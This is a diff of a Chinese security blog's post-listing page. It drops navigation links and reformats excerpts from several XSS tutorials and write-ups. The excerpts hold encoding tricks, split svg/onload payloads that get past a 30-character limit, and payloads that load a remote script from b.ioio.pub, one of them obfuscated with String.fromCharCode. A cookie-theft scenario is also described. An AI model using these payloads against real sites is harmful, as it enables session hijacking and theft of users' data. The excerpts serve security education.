@@ -53,24 +53,6 @@
     </h1>
     <ul class="nav">
         
-            
-                <li>
-                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
-            
-                </li>
-        
     </ul>
 </div>
 
@@ -121,7 +103,15 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&lt;script&gt;&lt;/script&gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分 0x01 一些编码 URL编码 %+字符的ASCII编码对应的两位十六进制，如&quot;/&quot;的url编码为&quot;%2F&quot; HTML编码 实体编码 &amp;开头分号结尾，如 &quot;&lt;&quot; 的编码是 &quot;&amp;lt;&quot; 字符编码 样式为&quot;&amp;#数值;&quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&quot;&lt;&quot;可编码为&quot;&amp;#060;&quot;和&quot;&amp;#x3c;&quot;，但是必须在属性值里面 JS编码 1、两个十六进制数字，如果不够个数，前面补0，例如&quot;&lt;&quot;编码为&quot;\x3c&quot; 2、三个八进制数字，如果不够个数，前面补0，例如&quot;&lt;&quot;编码为&quot;\074&quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&quot;&lt;&quot;编码为&quot;\u003c&quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r） CSS编码 反斜线(\)后跟1~6位的16进制数字，如&quot;e&quot;为&quot;\65&quot;或&quot;65&quot;或&quot;00065&quot; 0x02 编码与解码顺序 解码时先解码最外层，编码时先编码最内层 如&lt;td onclick=&quot;openUrl(add.do?userName='{$value}');&quot;&gt;11&lt;/td&gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&gt;js解码-&gt;url解码 编码顺序为：url编码-&gt;js编码-&gt;html编码 0x03 利用 八进制 &lt;p id=&quot;test&quot;&gt;&lt;/p&gt; &lt;script type=&quot;text/javascript&quot;&gt; var test = &quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&quot;; var p = document.getElementById('test'); #这里会进行js解码 p.innerHTML = test; &lt;/script&gt; 十进制和十六进制 &lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt; &lt;img src=x onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; javascript协议 &lt;a href=&quot;javascript:alert(1)&quot;&gt;xxx&lt;/a&gt; data协议 &lt;a href=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;xxxxxx&lt;/a&gt; &lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;111&lt;/a&gt; &lt;meta
+        0x00 浏览器解析  浏览器收到服务器发来的HTML内容，会从头解析，遇到&lt;script&gt;&lt;/script&gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分   0x01 一些编码  URL编码
+%+字符的ASCII编码对应的两位十六进制，如&quot;/&quot;的url编码为&quot;%2F&quot;  HTML编码
+ 实体编码
+&amp;开头分号结尾，如 &quot;&lt;&quot; 的编码是 &quot;&amp;lt;&quot;  字符编码
+样式为&quot;&amp;#数值;&quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&quot;&lt;&quot;可编码为&quot;&amp;#060;&quot;和&quot;&amp;#x3c;&quot;，但是必须在属性值里面   JS编码
+1、两个十六进制数字，如果不够个数，前面补0，例如&quot;&lt;&quot;编码为&quot;\x3c&quot; 2、三个八进制数字，如果不够个数，前面补0，例如&quot;&lt;&quot;编码为&quot;\074&quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&quot;&lt;&quot;编码为&quot;\u003c&quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）  CSS编码
+反斜线(\)后跟1~6位的16进制数字，如&quot;e&quot;为&quot;\65&quot;或&quot;65&quot;或&quot;00065&quot;   0x02 编码与解码顺序  解码时先解码最外层，编码时先编码最内层
+如&lt;td onclick=&quot;openUrl(add.do?userName='{$value}');&quot;&gt;11&lt;/td&gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&gt;js解码-&gt;url解码 编码顺序为：url编码-&gt;js编码-&gt;html编码   0x03 利用  八进制
+&lt;p id=&quot;test&quot;&gt;&lt;/p&gt; &lt;script type=&quot;text/javascript&quot;&gt; var test = &quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&quot;; var p = document.getElementById('test'); #这里会进行js解码 p.
     </p>
 
     
@@ -174,9 +164,15 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        首先感谢凯神的指导。。。 0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可： &lt;script&gt;alert(1)&lt;/script&gt; &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a 但是这个要在点击删除时payload才起作用 也可用&lt;img src=1 onerror=alert(1) /&gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js 0x03 加载自己的js 此时的限制条件为： * 30个字符 * script标签不能自己触发 只能构造类似下面的语句自己加载脚本： a=document.createElement('script'); a.src=&quot;www.xxx.com&quot;; document.head.appendChild(a); 可以用如下方法分割，多次添加： a=document.createE/* */lement('script');/* */a.src=&quot;www.xxx.com&quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行 查找 构造payload 使用如下payload： &lt;svg/onload=&quot;b='http://t.i'&quot;&gt; &lt;svg/onload=&quot;b+='m/16ap6'&quot;&gt; &lt;svg/onload=&quot;$loadJs(b)&quot;&gt; 0x04 得到Cookie
+        首先感谢凯神的指导。。。
+0x00 注册账号  先得到一个临时邮箱，然后注册账号  0x01 找输入输出点   0x02 尝试构造payload  payload用如下的即可：
+&lt;script&gt;alert(1)&lt;/script&gt; &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a  但是这个要在点击删除时payload才起作用 也可用&lt;img src=1 onerror=alert(1) /&gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js   0x03 加载自己的js  此时的限制条件为：   * 30个字符 * script标签不能自己触发    只能构造类似下面的语句自己加载脚本：   a=document.createElement('script'); a.src=&quot;www.xxx.com&quot;; document.head.appendChild(a);    可以用如下方法分割，多次添加：   a=document.createE/* */lement('script');/* */a.src=&quot;www.xxx.com&quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行    查找  构造payload    使用如下payload： &lt;svg/onload=&quot;b='http://t.
     </p>
 
+    
+    <footer>
+        <a href="/posts/xss-example/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
     
 </article>
 
@@ -223,7 +219,16 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 XSS的检测 检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测 手工检测：检测结果准确，但对于大型web来说费时费力 软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出 检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出 1. 手工检测 可得知输出位置: • 输入敏感字符，如“&lt;、&gt;、&quot;、'、()”等，然后在提交后查看html源代码，看这些字符是否被转义。 • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&lt;&gt;&quot;&amp;'()”字符串，然后查找AAAAAA或许比较方便。 无法得知输出位置: 很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如： 在标签中：&lt;div&gt;XSS Test&lt;/div&gt; 在属性内：&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;XSS Test&quot; /&gt; 这种情况通常采用输入&quot;/&gt;XSS Test来测试。 2. 全自动检测XSS 如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。 专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。 一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。 0x01 XSS的挖掘与利用 XSS漏洞挖掘 反射型XSS： 一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严 存储型XSS： 可以提交内容 提交的内容可被管理员或其他用户看到 提交的内容没有被过滤或过滤不严 XSS漏洞利用 XSS一般就是闭合标签，和SQL注入类似，常见payload如下： • &lt;script src='http://b.ioio.pub/xss/probe.js'&gt;&lt;/script&gt; • &lt;img src=x onerror=&quot;s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'&quot;;&gt; • &lt;svg onload=s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js&gt; • &lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99, 114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59, 115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47, 112,114,111,98,101,46,106,115)) &gt; 0x03 XSS简单示例 反射型xss简单示例: • &lt;?php echo $_GET['x']; ?&gt; • 提交： /xss.php?x=&lt;script&gt;alert(1)&lt;/script&gt;
+        0x00 XSS的检测  检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测
+手工检测：检测结果准确，但对于大型web来说费时费力
+软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出
+检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出
+1. 手工检测 可得知输出位置: • 输入敏感字符，如“&lt;、&gt;、&quot;、'、()”等，然后在提交后查看html源代码，看这些字符是否被转义。 • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&lt;&gt;&quot;&amp;'()”字符串，然后查找AAAAAA或许比较方便。 无法得知输出位置: 很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如： 在标签中：&lt;div&gt;XSS Test&lt;/div&gt; 在属性内：&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;XSS Test&quot; /&gt; 这种情况通常采用输入&quot;/&gt;XSS Test来测试。  2. 全自动检测XSS 如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。
+专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。
+一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。
+ 0x01 XSS的挖掘与利用  XSS漏洞挖掘
+反射型XSS： 一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严 存储型XSS： 可以提交内容 提交的内容可被管理员或其他用户看到 提交的内容没有被过滤或过滤不严  XSS漏洞利用 XSS一般就是闭合标签，和SQL注入类似，常见payload如下：
+• &lt;script src='http://b.ioio.pub/xss/probe.js'&gt;&lt;/script&gt; • &lt;img src=x onerror=&quot;s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'&quot;;&gt; • &lt;svg onload=s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js&gt; • &lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99, 114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59, 115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47, 112,114,111,98,101,46,106,115)) &gt;   0x03 XSS简单示例  反射型xss简单示例: • &lt;?
     </p>
 
     
@@ -276,7 +281,13 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 简介 &nbsp;&nbsp;&nbsp;&nbsp;XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&rdquo;脚本&rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。 &nbsp;&nbsp;&nbsp;&nbsp;要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。 0x01 危害 &nbsp;&nbsp;&nbsp;&nbsp;JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。 • 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等 0x02 攻击场景 &nbsp;&nbsp;&nbsp;&nbsp;在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。 • 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等 0x03 分类 主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。 1. 反射型XSS &nbsp;&nbsp;&nbsp;&nbsp;反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。 简单流程： 用户访问带有XSS代码的URL请求 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： • 用户aaa在网站www.xxx.com浏览网页 • 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com • hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 • 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com • hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息 2. 存储型XSS &nbsp;&nbsp;&nbsp;&nbsp;存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。 测试技巧： • 首先确定输入点和输出点，比如留言，若留言输出(显示)的地方是标签内，则XSS代码会被执行，但若输出在属性内，则不会执行， 如：&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot; /&gt; • 确定输出点后根据相应的标签构造HTML代码来闭合，如：&quot; /&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;，最终在html中为： &lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot; /&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;&quot; /&gt; 测试步骤： • 添加正常留言，用firebug快速查找显示标签，若显示区域不在html属性内则可以直接使用XSS代码注入 • 若不能得知内容输出的位置，可以使用模糊测试方案，XSS代码如下： a.
+        0x00 简介  &nbsp;&nbsp;&nbsp;&nbsp;XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&rdquo;脚本&rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
+&nbsp;&nbsp;&nbsp;&nbsp;要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
+ 0x01 危害  &nbsp;&nbsp;&nbsp;&nbsp;JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
+• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等   0x02 攻击场景  &nbsp;&nbsp;&nbsp;&nbsp;在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
+• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等   0x03 分类  主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
+1. 反射型XSS &nbsp;&nbsp;&nbsp;&nbsp;反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
+简单流程： 用户访问带有XSS代码的URL请求 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： • 用户aaa在网站www.xxx.com浏览网页 • 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com • hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 • 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com • hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息  2. 存储型XSS &nbsp;&nbsp;&nbsp;&nbsp;存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。
     </p>
 
     
